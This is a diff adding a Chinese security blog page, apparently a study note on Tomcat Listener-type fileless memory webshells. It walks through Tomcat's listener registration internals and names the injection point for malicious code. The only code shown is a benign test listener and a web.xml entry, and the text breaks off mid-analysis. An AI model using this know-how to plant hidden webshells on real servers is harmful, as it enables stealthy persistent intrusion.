@@ -1,0 +1,1246 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head><!-- hexo injector head_begin start --><progress id="content_progress" value="0"></progress><!-- hexo injector head_begin end -->
+  <meta charset="UTF-8">
+  
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/pig.png">
+  <link rel="icon" href="/img/pig.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#3F4B3B">
+  <meta name="author" content="Piggy Sprint">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="内存马系列--Listener型">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内存马系列--Listener型">
+<meta property="og:url" content="http://example.com/2026/04/12/%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97--Listener%E5%9E%8B/index.html">
+<meta property="og:site_name" content="Piggy Sprint&#39;s blog">
+<meta property="og:description" content="内存马系列--Listener型">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260407213453678.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260407213829176.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260407214403803.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260407214518228.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260408163702518.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260408164331373.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260408164459160.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260408164608194.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260408200428123.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260408200950102.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260408201229539.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260408202554338.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260408204044779.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260408204202212.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260408204612319.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260408204725226.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260408204906856.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260408205331735.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260408212649625.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260410152315597.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260409110422301.png">
+<meta property="og:image" content="http://example.com/AppData/Roaming/Typora/typora-user-images/image-20260409110422933.png">
+<meta property="article:published_time" content="2026-04-12T03:00:00.000Z">
+<meta property="article:modified_time" content="2026-04-12T14:08:43.496Z">
+<meta property="article:author" content="Piggy Sprint">
+<meta property="article:tag" content="Java安全">
+<meta property="article:tag" content="内存马">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260407213453678.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>内存马系列--Listener型 - Piggy Sprint&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+
+
+  
+<link rel="stylesheet" href="/custom/LoadingBar/pace-theme-barber-shop.css">
+<link rel="stylesheet" href="/css/cloudedGlass.css">
+<link rel="stylesheet" href="/custom/ReadingProgress/ReadingProgress.css">
+<link rel="stylesheet" href="/css/Loadanimation.css">
+<link rel="stylesheet" href="/css/StrongInDark.css">
+<link rel="stylesheet" href="/css/TitleNeon.css">
+<link rel="stylesheet" href="/css/TitleGradient.css">
+<link rel="stylesheet" href="/css/ScrollBar.css">
+<link rel="stylesheet" href="https://lib.baomitu.com/font-awesome/6.1.2/css/all.min.css">
+<link rel="stylesheet" href="/css/CodeBlock.css">
+<link rel="stylesheet" href="/css/CodeInLine.css">
+<link rel="stylesheet" href="/css/RandomBanner.css">
+<link rel="stylesheet" href="/css/scrollAnimation.css">
+<link rel="stylesheet" href="/css/Background.css">
+<link rel="stylesheet" href="/css/FrostedGlassBg.css">
+<link rel="stylesheet" href="/css/Sidebar.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":false,"default":"TEXT"},"copy_btn":false,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"7H0Tkmd6gbla1cOeZ7rS44zF-gzGzoHsz","app_key":"byZ7eSN7DH9MXIyDyXwXE8SE","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+  <script src="/js/backgroundize.js"></script>
+  <script src="/js/injector.js"></script>
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-shiki-plugin@latest/lib/codeblock.css">
+<style>:root{--hl-color:#abb2bf;--hl-bg:#282c34;--hltools-bg:#21252b;--hltools-color:#bbbbbc;--hlnumber-bg:#282c34;--hlnumber-color:#495162;--hlscrollbar-bg:#373c47;--hlexpand-bg:linear-gradient(180deg,rgba(40,44,52,0.1),rgba(40,44,52,0.9))}</style>
+    <style>
+    .code-expand-btn:not(.expand-done) ~ div.codeblock,
+    .code-expand-btn:not(.expand-done) ~ * div.codeblock {
+      overflow: hidden;
+      height: 360px;
+    }
+    </style>
+  <!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+   <div id="bg-layer"></div>
+  <div id="loader-container"> 
+    <div id="loader" class="loader"></div>
+    <div class="loader-inner">
+        <div class="loader-line-wrap">
+            <div class="loader-line"></div>
+        </div>
+        <div class="loader-line-wrap">
+            <div class="loader-line"></div>
+        </div>
+        <div class="loader-line-wrap">
+            <div class="loader-line"></div>
+        </div>
+        <div class="loader-line-wrap">
+            <div class="loader-line"></div>
+        </div>
+        <div class="loader-line-wrap">
+            <div class="loader-line"></div>
+        </div>
+    </div>
+</div>
+
+<script src="/js/RainbowLoading.js" type="text/javascript"></script>
+<link href="/css/RainbowLoading.css" type="text/css" rel="stylesheet"/>
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong class="navbar-title"> 🐽🐽 Piggy Sprint &#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/banner/random.webp') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="内存马系列--Listener型"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-12 11:00" pubdate>
+          2026年4月12日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          24 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">内存马系列--Listener型</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <blockquote>
+<p>参考文章：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/#0x02-Listener-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">Java内存马系列-04-Tomcat 之 Listener 型内存马 | Drunkbaby’s Blog</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/Y4tacker/JavaSec/blob/main/5.%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/Tomcat/Tomcat-Listener%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Listener%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC.md">JavaSec&#x2F;5.内存马学习&#x2F;Tomcat&#x2F;Tomcat-Listener型内存马&#x2F;Tomcat-Listener型内存马.md at main · Y4tacker&#x2F;JavaSec</a></li>
+<li><a target="_blank" rel="noopener" href="https://bxhhf.github.io/2025/12/07/yuque-hexo-post/%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97--Listener%E5%9E%8B/#%E5%8A%A0%E8%BD%BD-listener">内存马系列–Listener型 - bxhhf</a></li>
+</ul>
+</blockquote>
+<p>内存马可以实现落地无文件，有很强的隐蔽性，但是攻击方式比较局限，只能文件上传。相较于反序列化的话，反序列化的危害性要强的多的多。</p>
+<p>我的理解：内存马依赖于漏洞点，首先得有漏洞点（<strong>不只限于</strong>反序列化漏洞。只要一个漏洞能让你在服务器上<strong>执行 Java 代码（RCE）</strong>，你就可以注入内存马），然后通过漏洞点将🐎打进去，这样的话会更加隐蔽。就拿反序列化来说，有这类的漏洞exp往往包含着大量的类名，特征比较明显，容易被防火墙防护；反序列化发送payloade过去是到达服务器，客户端看不到回显；官方修复的时候稍微改改逻辑或者限制一下类名，链子可能就不能用了。</p>
+<p>话不多说，我们现在开始学习Listener型内存马。之前在前文基础内容里面已经提过了 Tomcat 的一些架构知识，这里的话就不再赘述，简单写一下 Listener 的基础知识。</p>
+<h1 id="Listener-基础知识"><a href="#Listener-基础知识" class="headerlink" title="Listener 基础知识"></a>Listener 基础知识</h1><p>Java Web 开发中的<code>Listener</code>(监听器) 是一个实现了特定接口的 Java 程序，它用于监听 Web 应用内部的对象（如 <code>ServletContext</code>、<code>HttpSession</code>、<code>ServletRequest</code>）的<strong>创建、销毁</strong>或<strong>属性修改</strong>等动作。</p>
+<p>当这些事件发生时，Web 容器（如 Tomcat）会自动调用监听器中对应的方法，从而实现某种功能，比如统计在线人数、初始化资源或记录访问日志。</p>
+<p><strong>用途：</strong></p>
+<p>可以使用监听器监听客户端的请求、服务端的操作等。通过监听器，可以自动出发一些动作，比如监听在线的用户数量，统计网站访问量、网站访问监控等。</p>
+<p><strong>Listener 三个域对象：</strong></p>
+<ul>
+<li>ServletContextListener（应用<strong>启动</strong>与<strong>销毁</strong>时）</li>
+<li>HttpSessionListener（Session <strong>创建</strong>与<strong>销毁</strong>时）</li>
+<li>ServletRequestListener（<strong>每次请求</strong>进入和结束时）</li>
+</ul>
+<p>很明显，ServletRequestListener 是最适合用来作为内存马的。因为 ServletRequestListener 是用来监听 ServletRequest对 象的，当我们访问任意资源时，都会触发<code>ServletRequestListener#requestInitialized()</code>方法。</p>
+<h1 id="Listener-基础代码实现"><a href="#Listener-基础代码实现" class="headerlink" title="Listener 基础代码实现"></a>Listener 基础代码实现</h1><p>和之前 Filter 型内存马的原理其实是一样的，之前我们说到 Filter 内存马需要定义一个实现 Filter 接口的类，Listener 也是一样，我们直接在之前创建好的 Servlet 项目里面进行操作</p>
+<p>要求 Listener 的业务对象要实现 <code>EventListener</code> 这个接口</p>
+<p>我们可以先去看一下 <code>EventListener</code> 这个接口</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260407213453678.png" srcset="/img/loading.gif" lazyload alt="image-20260407213446503"></p>
+<p>它有非常多的实现类，如果我们需要实现内存马的话就需要找一个每个请求都会触发的 <code>Listener</code>（我们去寻找的时候一定是优先找 <strong>Servlet</strong> 开头的类）</p>
+<p>这里找到了 <code>ServletRequestListener</code> ，因为根据名字以及其中的 <code>requestInitialized()</code> 方法感觉我们的发送的每个请求都会触发这个监控器。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260407213829176.png" srcset="/img/loading.gif" lazyload alt="image-20260407213829054"></p>
+<p>这里我们尝试自己写一个 <code>Listener</code>，并进行测试。</p>
+<p>因为前面猜想 <code>requestInitialized()</code> 方法可以触发 Listener 监控器，所以我们在 <code>requestInitialized()</code> 方法里面加上一些代码，来证明它何时被执行。</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">package</span><span style="color: #E06C75"> </span><span style="color: #FFFFFF">L</span><span style="color: #C678DD">istener</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.servlet.ServletRequestEvent</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.servlet.ServletRequestListener</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.servlet.annotation.WebListener</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.util.EventListener</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">WebListener</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;/listenerTest&quot;</span><span style="color: #E06C75">)  </span></span>
+<span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ListenerTest</span><span style="color: #E06C75"> </span><span style="color: #C678DD">implements</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ServletRequestListener</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> ListenerTest</span><span style="color: #ABB2BF">(){  </span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> requestDestroyed</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">ServletRequestEvent</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">sre</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{  </span></span>
+<span class="line"><span style="color: #ABB2BF">  </span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #E06C75"> </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> requestInitialized</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">ServletRequestEvent</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">sre</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{  </span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Listener 被调用&quot;</span><span style="color: #ABB2BF">);  </span></span>
+<span class="line"><span style="color: #ABB2BF"> }</span><span style="color: #E06C75">  </span></span>
+<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260407214403803.png" srcset="/img/loading.gif" lazyload alt="image-20260407214403672"></p>
+<p>改一下web.xml</p>
+<figure class="shiki xml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">listener</span><span style="color: #ABB2BF">&gt;  </span></span>
+<span class="line"><span style="color: #ABB2BF"> &lt;</span><span style="color: #E06C75">listener-class</span><span style="color: #ABB2BF">&gt;Listener.ListenerTest&lt;/</span><span style="color: #E06C75">listener-class</span><span style="color: #ABB2BF">&gt;  </span></span>
+<span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">listener</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260407214518228.png" srcset="/img/loading.gif" lazyload alt="image-20260407214518179"></p>
+<p>至此，Listener 基础代码实现完成，下面我们来分析 Listener 的运行流程</p>
+<h1 id="Listener-流程分析"><a href="#Listener-流程分析" class="headerlink" title="Listener 流程分析"></a>Listener 流程分析</h1><blockquote>
+<p>主要解决两个问题：</p>
+<ul>
+<li>我们的恶意代码应该在哪儿编写？</li>
+<li>Tomcat 中的 Listener 是如何实现注册的？</li>
+</ul>
+</blockquote>
+<h2 id="访问Listener-前"><a href="#访问Listener-前" class="headerlink" title="访问Listener 前"></a>访问Listener 前</h2><h3 id="先读取-web-xml"><a href="#先读取-web-xml" class="headerlink" title="先读取 web.xml"></a>先读取 web.xml</h3><ul>
+<li><p>在启动应用的时候，<code>ContextConfig</code> 类会去读取配置文件，所以我们去到 <code>ContextConfig</code> 这个类里面找一下哪个方法是来读取配置文件的。就找到了 <code>configureContext()</code> 方法（这个方法会调用了 web.xml，把 web.xml 作为参数传进去，然后进行调用的）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260408163702518.png" srcset="/img/loading.gif" lazyload alt="image-20260408163655384"></p>
+<p>作用：它的任务是将已经读取并解析好的 <code>web.xml</code> 文件内容（封装在 <code>WebXml</code> 对象中），<strong>正式填充（配置）到 Tomcat 的运行时上下文 <code>StandardContext</code>（即代码中的 <code>context</code> 对象）里</strong>。</p>
+<p>是 Tomcat 启动时，将“静态配置”转化为“内存中运行组件”的关键过程。</p>
+<p>还将web.xml里面的组件（filter，listener）配到了里面</p>
+</li>
+<li><p>这里我们最关注的当然是<code>listener</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260408164331373.png" srcset="/img/loading.gif" lazyload alt="image-20260408164331317"></p>
+<p>可以在这块打个断点标记一下</p>
+</li>
+<li><p>我们接下来再看读取listerner提及的<code>addApplicationListener（）</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260408164459160.png" srcset="/img/loading.gif" lazyload alt="image-20260408164459117"></p>
+<p>进去之后发现是一个接口中的方法，我们去找它的实现方法</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260408164608194.png" srcset="/img/loading.gif" lazyload alt="image-20260408164608160"></p>
+<p>进去第一个 <code>FailedContext</code> 类里面的 <code>addApplicationListener()</code> 是没东西的，所以东西在 <code>StandContext</code> 里面。</p>
+</li>
+</ul>
+<p><strong>开始调试：</strong></p>
+<ul>
+<li><p>第一步，直接获取到 web.xml</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260408200428123.png" srcset="/img/loading.gif" lazyload alt="image-20260408200427919"></p>
+<p>我们看到 webxml 里面的 listener 已经有了对应的 Listener 文件，继续往下走。</p>
+</li>
+<li><p>下一步应该是走到 <code>addApplicationListener()</code> 这里</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260408200950102.png" srcset="/img/loading.gif" lazyload alt="image-20260408200950053"></p>
+</li>
+</ul>
+<h3 id="读取完配置文件，加载-Listener"><a href="#读取完配置文件，加载-Listener" class="headerlink" title="读取完配置文件，加载 Listener"></a>读取完配置文件，加载 Listener</h3><ul>
+<li><p>当我们读取完配置文件，当应用启动的时候，<code>StandardContext</code> 会去调用 <code>listenerStart()</code> 方法。这个方法做了一些基础的安全检查，最后完成简单的 start 业务。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260408201229539.png" srcset="/img/loading.gif" lazyload alt="image-20260408201229463"></p>
+<p>标记的那一句</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">String</span><span style="color: #E06C75"> listeners[] </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">findApplicationListeners</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span></code></pre></div></div></figure>
+
+<p>简单说，就是把<code>之前的 Listener</code> 存到这里面</p>
+</li>
+</ul>
+<h2 id="Listener-运行过程"><a href="#Listener-运行过程" class="headerlink" title="Listener 运行过程"></a>Listener 运行过程</h2><ul>
+<li><p>先下在 <code>requestInitialized()</code> 方法这里的能看到调用链（代码是“自下而上”执行的）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260408202554338.png" srcset="/img/loading.gif" lazyload alt="image-20260408202554193"></p>
+<p>能看到<code>fireRequestInitEvent</code>是在<code>StandardContext</code>的方法（StandardContext里面有触发点）</p>
+<p>说白了就是要看<code>fireRequestInitEvent</code></p>
+</li>
+<li><p>断在<code>fireRequestInitEvent</code>里面</p>
+<p>先进到 <code>getApplicationEventListeners()</code> 方法里面</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260408204044779.png" srcset="/img/loading.gif" lazyload alt="image-20260408204044732">其实就是在<strong>获取一个 Listener 数组</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260408204202212.png" srcset="/img/loading.gif" lazyload alt="image-20260408204202167"></p>
+<p>看一下 <code>applicationEventListenersList</code> 是什么，其实Listener 实际上是存储在 <code>applicationEventListenersList</code> 属性中的。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260408204612319.png" srcset="/img/loading.gif" lazyload alt="image-20260408204612280"></p>
+<p>而且我们可以通过<code>StandardContext#addApplicationEventListener()</code> 方法来添加 Listener</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260408204725226.png" srcset="/img/loading.gif" lazyload alt="image-20260408204724988"></p>
+</li>
+<li><p>接下来的逻辑就和<code>Filter</code> 差不多了，Listener 这里有一个 Listener 数组，对应的 Filter 里面也有一个 Filter 数组。在 Listener 组内的 Listeners 会被逐个触发，最后到我们自己定义的 Listener 的 <code>requestInitialized()</code> 方法去。</p>
